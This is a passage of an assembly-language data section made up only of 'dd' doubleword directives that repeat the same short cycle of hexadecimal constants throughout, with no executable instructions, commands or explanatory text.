		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
